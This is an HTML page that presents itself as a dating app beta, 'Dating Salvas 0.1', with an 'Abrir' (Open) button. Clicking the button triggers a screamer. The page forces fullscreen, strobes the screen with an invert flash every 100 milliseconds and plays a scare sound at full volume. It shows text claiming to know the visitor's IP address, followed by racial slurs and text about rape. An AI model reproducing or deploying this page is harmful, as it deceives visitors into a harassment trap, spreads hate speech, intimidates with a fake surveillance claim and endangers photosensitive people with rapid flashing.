<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Abrir</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #111;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  overflow: hidden;
}

/* screens */
#startScreen, #effectScreen {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

#startScreen {
  background: linear-gradient(180deg, #111, #000);
  gap: 16px;
  text-align: center;
  padding: 24px;
}

button {
  padding: 14px 28px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
}

#openBtn {
  background: white;
  color: black;
  font-weight: bold;
}

/* EFFECT SCREEN */
#effectScreen {
  display: none;
  
  background: black;
  transition: filter 0.2s ease;
}

/* invert effect */
.invert {
  filter: invert(1);
}

/* glitch text */
.glitch {
  font-size: 56px;
  font-weight: bold;
  letter-spacing: 4px;
  animation: flickerSafe 1.2s infinite, shake 0.18s infinite;
  text-shadow: 2px 0 red, -2px 0 cyan;
  user-select: none;
}

/* overlay lines */
.overlay {
  position: absolute;
  inset: 0;
  pointer-events: none;
  background:
    repeating-linear-gradient(
      to bottom,
      rgba(255,255,255,0.03) 0px,
      rgba(255,255,255,0.03) 2px,
      transparent 2px,
      transparent 4px
    );
  animation: drift 6s linear infinite;
}

.exitHint {
  position: absolute;
  bottom: 20px;
  font-size: 14px;
  opacity: 0.7;
}

/* animations */
@keyframes flickerSafe {
  0%   { background: #000; color: #fff; opacity: 1; }

  100% { background: #000; color: #fff; opacity: 1; }
}

@keyframes shake {
  0% { transform: translate(0, 0); }
  25% { transform: translate(1px, -1px); }
  50% { transform: translate(-1px, 1px); }
  75% { transform: translate(1px, 1px); }
  100% { transform: translate(0, 0); }
}

@keyframes drift {
  from { transform: translateY(0); }
  to { transform: translateY(8px); }
}
</style>
</head>

<body>

<div id="startScreen">
  <h1>Dating Salvas 0.1</h1>
  <p>Beta Progress.</p>
  <button id="openBtn">Abrir</button>
</div>

<div id="effectScreen">
  <div class="overlay"></div>
  <div class="glitch" id="text">YOUR IP IS 91.42.152.152</div>
  <div class="exitHint">FUCK YOU NIGGER</div>

  <audio id="scareAudio" preload="auto">
    <source src="scare.mp3" type="audio/mpeg">
  </audio>
</div>

<script>
const openBtn = document.getElementById("openBtn");
const startScreen = document.getElementById("startScreen");
const effectScreen = document.getElementById("effectScreen");
const audio = document.getElementById("scareAudio");
const text = document.getElementById("text");

let invertInterval;

/* fullscreen */
async function enterFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) {
    await el.requestFullscreen();
  }
}

/* invert effect */
function startInvertEffect() {
  let state = false;

  invertInterval = setInterval(() => {
    state = !state;
    effectScreen.classList.toggle("invert", state);
  }, 100);
}

function stopInvertEffect() {
  clearInterval(invertInterval);
  effectScreen.classList.remove("invert");
}

/* open */
openBtn.addEventListener("click", async () => {
  try { await enterFullscreen(); } catch (e) {}

  startScreen.style.display = "none";
  effectScreen.style.display = "flex";

  startInvertEffect();

  audio.volume = 1;
  audio.play().catch(() => {});
  

  setTimeout(() => {
    text.textContent = "RAPE NIGGAS RAPE NIGGAS";
  }, 2500);
});

/* ESC to exit */
document.addEventListener("keydown", async (e) => {
  if (e.key === "Escape") {
    effectScreen.style.display = "none";
    startScreen.style.display = "flex";

    stopInvertEffect();

    audio.pause();
    audio.currentTime = 0;

    if (document.fullscreenElement) {
      try { await document.exitFullscreen(); } catch {}
    }
  }
});
</script>

</body>
</html>
